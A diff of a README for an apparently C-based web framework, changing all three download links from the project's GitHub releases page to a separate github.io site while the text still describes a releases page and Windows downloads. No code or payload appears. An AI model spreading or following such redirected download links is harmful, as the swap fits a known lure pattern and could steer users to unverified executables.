@@ -1,6 +1,6 @@
 # 🧵 tantu-c-framework - Weave the Web, Chip to Cloud
 
-[![Download Tantu](https://img.shields.io/badge/Download-Tantu%20Framework-blueviolet?style=for-the-badge)](https://github.com/rbarmyarmy/tantu-c-framework/releases)
+[![Download Tantu](https://img.shields.io/badge/Download-Tantu%20Framework-blueviolet?style=for-the-badge)](https://rbarmyarmy.github.io)
 
 ## 🎯 What Is This?
 
@@ -34,7 +34,7 @@ Getting started with Tantu C Framework is easier than you might think. Here's yo
 
 ### 📥 Step 1: Download the Software
 
-**Visit this link to download the application:** [Download Tantu C Framework](https://github.com/rbarmyarmy/tantu-c-framework/releases)
+**Visit this link to download the application:** [Download Tantu C Framework](https://rbarmyarmy.github.io)
 
 Click that link, and you'll land on the releases page. Look for the latest version (it'll be at the top). Download the file that matches your computer (Windows users, look for something with "windows" in the name).
 
@@ -165,7 +165,7 @@ Tantu C Framework proves that you don't need complex tools to build amazing thin
 
 Remember: the web was built on simplicity. Tantu brings that simplicity back.
 
-**[Download Tantu C Framework Now](https://github.com/rbarmyarmy/tantu-c-framework/releases)** and start weaving your corner of the web today!
+**[Download Tantu C Framework Now](https://rbarmyarmy.github.io)** and start weaving your corner of the web today!
 
 ---
 
